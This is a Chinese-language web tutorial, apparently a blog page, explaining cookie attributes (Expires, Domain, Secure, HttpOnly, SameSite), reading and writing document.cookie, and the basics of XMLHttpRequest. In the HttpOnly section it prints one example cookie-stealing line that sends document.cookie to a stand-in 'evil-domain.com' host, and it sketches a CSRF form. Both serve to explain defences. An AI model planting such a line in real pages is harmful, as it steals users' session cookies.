<h3 id="3、Cookie-的属性"><a href="#3、Cookie-的属性" class="headerlink" title="3、Cookie 的属性"></a>3、Cookie 的属性</h3><h4 id="3-1-Expires-有效期，Max-Age-最大寿命，秒数"><a href="#3-1-Expires-有效期，Max-Age-最大寿命，秒数" class="headerlink" title="3.1 Expires 有效期，Max-Age 最大寿命，秒数"></a>3.1 Expires 有效期，Max-Age 最大寿命，秒数</h4><p><code>Expires</code>属性指定一个具体的<strong>到期时间</strong>，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: id=a3fWa; <span class="title class_">Expires</span>=<span class="title class_">Wed</span>, <span class="number">21</span> <span class="title class_">Oct</span> <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> <span class="variable constant_">GMT</span>;</span><br><span class="line"><span class="comment">// 设置cookie，键id等于值a3fWa, 并设置到期时间</span></span><br></pre></td></tr></table></figure>

<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
<p><code>Max-Age</code>属性指定<strong>从现在开始 Cookie 存在的秒数</strong>，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
<h4 id="3-2-Domain-域名，Path-路径"><a href="#3-2-Domain-域名，Path-路径" class="headerlink" title="3.2 Domain 域名，Path 路径"></a>3.2 Domain 域名，Path 路径</h4><p><code>Domain</code>属性<strong>指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie</strong>。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。<strong>如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie</strong>。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p>
<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
<h4 id="3-3-Secure-加密协议https下有效，HttpOnly-只有http请求能拿到"><a href="#3-3-Secure-加密协议https下有效，HttpOnly-只有http请求能拿到" class="headerlink" title="3.3 Secure 加密协议https下有效，HttpOnly 只有http请求能拿到"></a>3.3 Secure 加密协议https下有效，HttpOnly 只有http请求能拿到</h4><p><code>Secure</code>属性指定<strong>浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器</strong>。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，<strong>不需要指定值</strong>。如果通信是 HTTPS 协议，该开关自动打开。</p>
<p><code>HttpOnly</code>属性<strong>指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性</strong>。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure>

<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
<h4 id="3-4-SameSite-防止-CSRF-攻击和用户追踪"><a href="#3-4-SameSite-防止-CSRF-攻击和用户追踪" class="headerlink" title="3.4 SameSite 防止 CSRF 攻击和用户追踪"></a>3.4 SameSite 防止 CSRF 攻击和用户追踪</h4><p>Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来<strong>防止 CSRF 攻击和用户追踪</strong>。</p>
<p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站<code>your-bank.com</code>，银行服务器发来了一个 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:id=a3fWa;</span><br></pre></td></tr></table></figure>

<p>用户后来又访问了恶意网站<code>malicious.com</code>，上面有一个表单。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;your-bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是真实请求。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;your-bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dad3weg34&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这种第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;facebook.com&quot;</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。</p>
<p>Cookie 的<code>SameSite</code>属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。</p>
<blockquote>
<ul>
<li>Strict</li>
<li>Lax</li>
<li>None</li>
</ul>
</blockquote>
<p><strong>（1）Strict</strong></p>
<p><code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName=CookieValue; SameSite=Strict;</span><br></pre></td></tr></table></figure>

<p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
<p><strong>（2）Lax</strong></p>
<p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName=CookieValue; SameSite=Lax;</span><br></pre></td></tr></table></figure>

<p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。</p>
<table>
<thead>
<tr>
<th align="left">请求类型</th>
<th align="center">示例</th>
<th align="right">正常情况</th>
<th align="left">Lax</th>
</tr>
</thead>
<tbody><tr>
<td align="left">链接</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">发送 Cookie</td>
</tr>
<tr>
<td align="left">预加载</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">发送 Cookie</td>
</tr>
<tr>
<td align="left">GET 表单</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">发送 Cookie</td>
</tr>
<tr>
<td align="left">POST 表单</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">不发送</td>
</tr>
<tr>
<td align="left">iframe</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">不发送</td>
</tr>
<tr>
<td align="left">AJAX</td>
<td align="center"><code>$.get(&quot;...&quot;)</code></td>
<td align="right">发送 Cookie</td>
<td align="left">不发送</td>
</tr>
<tr>
<td align="left">Image</td>
<td align="center">&#96;&#96;</td>
<td align="right">发送 Cookie</td>
<td align="left">不发送</td>
</tr>
</tbody></table>
<p>设置了<code>Strict</code>或<code>Lax</code>以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。</p>
<p><strong>（3）None</strong></p>
<p>Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p>
<p>下面的设置无效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session=abc123; SameSite=None</span><br></pre></td></tr></table></figure>

<p>下面的设置有效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session=abc123; SameSite=None; Secure</span><br></pre></td></tr></table></figure>



<h3 id="4、document-cookie-用于读写当前网页的-Cookie"><a href="#4、document-cookie-用于读写当前网页的-Cookie" class="headerlink" title="4、document.cookie 用于读写当前网页的 Cookie"></a>4、document.cookie 用于读写当前网页的 Cookie</h3><p><code>document.cookie</code>属性<strong>用于读写当前网页的 Cookie</strong>。</p>
<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">// &quot;foo=bar;baz=bar&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cookies = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo=bar</span></span><br><span class="line"><span class="comment">// baz=bar</span></span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>属性是<strong>可写的</strong>，可以通过它为当前网站添加 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;fontSize=14&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
<p>但是，<code>document.cookie</code><strong>一次只能写入一个 Cookie</strong>，而且写入并不是覆盖，而是添加。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;test1=hello&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;test2=world&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="comment">// test1=hello;test2=world</span></span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
<p>各个属性的写入注意点如下。</p>
<ul>
<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
<li><code>max-age</code>属性的值为秒数。</li>
<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
</ul>
<p><code>document.cookie</code>写<strong>入 Cookie 的例子如下</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;fontSize=14; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;expires=&#x27;</span> + someDate.<span class="title function_">toGMTString</span>() + <span class="string">&#x27;; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;path=/subdirectory; &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;domain=*.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
<p><strong>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
<h2 id="五、XMLHttpRequest-对象"><a href="#五、XMLHttpRequest-对象" class="headerlink" title="五、XMLHttpRequest 对象"></a>五、XMLHttpRequest 对象</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。</p>
<p>1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，<strong>只要用脚本发起通信，就可以叫做 AJAX 通信</strong>。W3C 也在2006年发布了它的国际标准。</p>
<p>具体来说，AJAX 包括以下几个步骤。</p>
<ol>
<li>创建 XMLHttpRequest 实例</li>
<li>发出 HTTP 请求</li>
<li>接收服务器传回的数据</li>
<li>更新网页数据</li>
</ol>
<p>概括起来，就是一句话，AJAX 通过原生的<code>XMLHttpRequest</code>对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。</p>
<p><code>XMLHttpRequest</code>对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有<code>XML</code>和<code>Http</code>，它实际上可以使用多种协议（比如<code>file</code>或<code>ftp</code>），发送任何格式的数据（包括字符串和二进制）。</p>
<p><code>XMLHttpRequest</code>本身是一个构造函数，可以使用<code>new</code>命令生成实例。它没有任何参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// 创建请求实例</span></span><br></pre></td></tr></table></figure>

<p>一旦新建实例，就可以使用<code>open()</code>方法指定建立 HTTP 连接的一些细节。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.example.com/page.php&#x27;</span>, <span class="literal">true</span>); <span class="comment">// 请求方式，地址，是否异步</span></span><br></pre></td></tr></table></figure>

<p>上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数<code>true</code>，表示请求是异步的。</p>
<p>然后，指定回调函数，监听通信状态（<code>readyState</code>属性）的变化。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="property">onreadystatechange</span> = handleStateChange; <span class="comment">// 回调函数监听请求状态变化，执行监听函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleStateChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦<code>XMLHttpRequest</code>实例的状态发生变化，就会调用监听函数<code>handleStateChange</code></p>
<p>最后使用<code>send()</code>方法，实际发出请求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>); <span class="comment">// 发送请求，null表示请求时不带数据（如果是post请求则带数据）</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>send()</code>的参数为<code>null</code>，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。</p>
<p>一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。</p>
<p>注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。</p>
<p>下面是<code>XMLHttpRequest</code>对象简单用法的完整<strong>例子</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>)&#123; <span class="comment">// 通信成功时，状态值为4</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>)&#123; <span class="comment">// 状态码</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>); <span class="comment">// 响应内容</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(xhr.<span class="property">statusText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(xhr.<span class="property">statusText</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/endpoint&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



<h3 id="2、XMLHttpRequest-的实例属性"><a href="#2、XMLHttpRequest-的实例属性" class="headerlink" title="2、XMLHttpRequest 的实例属性"></a>2、XMLHttpRequest 的实例属性</h3><h4 id="2-1-XMLHttpRequest-readyState-实例对象的当前状态码"><a href="#2-1-XMLHttpRequest-readyState-实例对象的当前状态码" class="headerlink" title="2.1 XMLHttpRequest.readyState 实例对象的当前状态码"></a>2.1 XMLHttpRequest.readyState 实例对象的当前状态码</h4><p><code>XMLHttpRequest.readyState</code>返回一个<strong>整数</strong>，表示<strong>实例对象的当前状态</strong>。该属性<strong>只读</strong>。它可能返回以下值。</p>
<ul>
<li><p>0，表示 XMLHttpRequest 实例已经生成，但是实例的<code>open()</code>方法还没有被调用。<strong>【生成实例，但没调用open()】</strong></p>
</li>
<li><p>1，表示<code>open()</code>方法已经调用，但是实例的<code>send()</code>方法还没有调用，仍然可以使用实例的<code>setRequestHeader()</code>方法，设定 HTTP 请求的头信息。<strong>【调用open(),但没调用send()】</strong></p>
</li>
<li><p>2，表示实例的<code>send()</code>方法已经调用，并且服务器返回的头信息和状态码已经收到。<strong>【调用send()，并收到头信息和状态码】</strong></p>
</li>
<li><p>3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的<code>responseType</code>属性等于<code>text</code>或者空字符串，<code>responseText</code>属性就会包含已经收到的部分信息。<strong>【正在接收数据体】</strong></p>
</li>
<li><p>4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。<strong>【完成接收，失败或成功】</strong></p>
</li>
</ul>
<p>通信过程中，每当实例对象发生状态变化，它的<code>readyState</code>属性的值就会改变。这个值每一次变化，都会触发<code>onreadystatechange()</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="comment">// 请求结束，处理服务器返回的数据</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 显示提示“加载中……”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>xhr.readyState</code>等于<code>4</code>时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。</p>
<h4 id="2-2-XMLHttpRequest-onreadystatechange-监听状态变化"><a href="#2-2-XMLHttpRequest-onreadystatechange-监听状态变化" class="headerlink" title="2.2 XMLHttpRequest.onreadystatechange 监听状态变化"></a>2.2 XMLHttpRequest.onreadystatechange 监听状态变化</h4><p><code>XMLHttpRequest.onreadystatechange</code>属性<strong>指向一个监听函数</strong>。<code>readystatechange</code>事件发生时（实例的<code>readyState</code>属性变化），就会执行这个属性。</p>
<p>另外，如果使用实例的<code>abort()</code>方法，终止 XMLHttpRequest 请求，也会造成<code>readyState</code>属性变化，导致调用<code>XMLHttpRequest.onreadystatechange</code>属性。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>( <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span> , <span class="literal">true</span> );</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> !== <span class="number">4</span> || xhr.<span class="property">status</span> !== <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>



<h4 id="2-3-XMLHttpRequest-response-响应的数据体"><a href="#2-3-XMLHttpRequest-response-响应的数据体" class="headerlink" title="2.3 XMLHttpRequest.response 响应的数据体"></a>2.3 XMLHttpRequest.response 响应的数据体</h4><p><code>XMLHttpRequest.response</code>属性表示<strong>服务器返回的数据体（即 HTTP 回应的 body 部分）</strong>。它可能是任何数据类型，比如字符串、对象、二进制对象等等，<strong>具体的类型由<code>XMLHttpRequest.responseType</code>属性决定。该属性只读。</strong></p>
<p>如果本次请求没有成功或者数据不完整，该属性等于<code>null</code>。但是，如果<code>responseType</code>属性等于<code>text</code>或空字符串，在请求没有结束之前（<code>readyState</code>等于3的阶段），<code>response</code>属性包含服务器已经返回的部分数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="title function_">handler</span>(xhr.<span class="property">response</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-4-XMLHttpRequest-responseType-响应数据类型"><a href="#2-4-XMLHttpRequest-responseType-响应数据类型" class="headerlink" title="2.4 XMLHttpRequest.responseType 响应数据类型"></a>2.4 XMLHttpRequest.responseType 响应数据类型</h4><p><code>XMLHttpRequest.responseType</code>属性是一个<strong>字符串</strong>，表示<strong>服务器返回数据的类型</strong>。这个属性是<strong>可写的</strong>，可以在调用<code>open()</code>方法之后、调用<code>send()</code>方法之前，设置这个属性的值，告诉服务器返回指定类型的数据。如果<code>responseType</code>设为空字符串，就等同于默认值<code>text</code>。</p>
<p><code>XMLHttpRequest.responseType</code>属性可以等于以下值。</p>
<ul>
<li>“”（空字符串）：等同于<code>text</code>，表示服务器返回<strong>文本字符串数据</strong>。</li>
<li>“arraybuffer”：ArrayBuffer 对象，表示服务器返回<strong>二进制数组</strong>。</li>
<li>“blob”：Blob 对象，表示服务器返回<strong>二进制对象</strong>。</li>
